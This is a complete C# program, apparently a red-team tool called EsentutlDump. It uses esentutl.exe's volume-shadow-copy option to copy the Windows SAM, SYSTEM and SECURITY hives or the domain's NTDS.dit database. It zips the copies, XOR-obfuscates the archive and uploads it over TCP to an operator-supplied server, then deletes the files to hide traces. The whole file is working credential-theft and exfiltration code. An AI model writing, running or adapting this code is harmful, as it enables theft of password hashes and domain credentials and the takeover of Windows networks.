using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Security.Principal;

namespace EsentutlDump
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: EsentutlDump <ServerIP> <ServerPort> <FileToExtract>");
                Console.WriteLine("Example: EsentutlDump.exe 192.168.1.100 5000 sam");
                return;
            }

            string serverIp = args[0];
            int serverPort = int.Parse(args[1]);
            string fileToExtract = args[2];

            string samPath = "SAM";
            string ntdsPath = "ntds.dit";
            string systemPath = "SYSTEM";
            string securityPath = "SECURITY";

            if (!IsAdministrator())
            {
                Console.WriteLine("[+] Please run me as an administrator.");
                return;
            }

            string command = "esentutl.exe";
            string systemArgs = @"/y /vss C:\Windows\System32\config\SYSTEM";
            string securityArgs = @"/y /vss C:\Windows\System32\config\SECURITY";
            string samArgs = @"/y /vss C:\Windows\System32\config\SAM";
            string ntdsArgs = @"/y /vss C:\Windows\NTDS\ntds.dit";

            Console.WriteLine("[*] Dumping SYSTEM file...");
            RunCommand(command, systemArgs);

            Console.WriteLine("[*] Dumping SECURITY file...");
            RunCommand(command, securityArgs);

            if (fileToExtract.ToLower() == "sam")
            {
                Console.WriteLine("[*] Dumping SAM file...");
                RunCommand(command, samArgs);
                ZipAndXorUploadFiles(samPath, systemPath, securityPath, serverIp, serverPort);
            }
            else if (fileToExtract.ToLower() == "ntds")
            {
                Console.WriteLine("[*] Dumping NTDS file...");
                RunCommand(command, ntdsArgs);
                ZipAndXorUploadFiles(ntdsPath, systemPath, securityPath, serverIp, serverPort);
            }
            else
            {
                Console.WriteLine("[-] Invalid file selection. Please choose 'ntds' or 'sam'.");
            }


        }

        private static void RunCommand(string command, string arguments)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = command;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                //Console.WriteLine(output);
                Console.WriteLine("[+] Done sir!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] An error :( :" + ex.Message);
            }
        }

        private static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        public static void ZipAndXorUploadFiles(string samPath, string systemPath, string securityPath, string serverIp, int serverPort)
        {
            string zipFilePath = "unencrypted_files.zip";
            string xorFilePath = "encrypted_files.zip";
            string key = "RedKey";

            // Create the zip file without password protection
            using (FileStream zipFileStream = File.Create(zipFilePath))
            {
                using (ZipArchive archive = new ZipArchive(zipFileStream, ZipArchiveMode.Create))
                {
                    string[] filePaths = new string[] { samPath, systemPath, securityPath };

                    foreach (string filePath in filePaths)
                    {
                        if (File.Exists(filePath))
                        {
                            archive.CreateEntryFromFile(filePath, Path.GetFileName(filePath));
                        }
                    }
                }
            }

            // XOR the zip file with the key
            byte[] zipData = File.ReadAllBytes(zipFilePath);
            byte[] xorData = new byte[zipData.Length];
            byte[] keyData = System.Text.Encoding.ASCII.GetBytes(key);

            for (int i = 0; i < zipData.Length; i++)
            {
                xorData[i] = (byte)(zipData[i] ^ keyData[i % keyData.Length]);
            }

            File.WriteAllBytes(xorFilePath, xorData);
            File.Delete(samPath);
            File.Delete(securityPath);
            File.Delete(systemPath);
            // Upload the XORed zip file to the server
            using (TcpClient client = new TcpClient(serverIp, serverPort))
            {
                using (NetworkStream networkStream = client.GetStream())
                {
                    using (FileStream fileStream = File.OpenRead(xorFilePath))
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead;

                        while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            networkStream.Write(buffer, 0, bytesRead);
                        }
                    }
                }
            }

            // Delete the zip and XOR-ed zip files after uploading
            File.Delete(zipFilePath);
            File.Delete(xorFilePath);

        }

    }
}
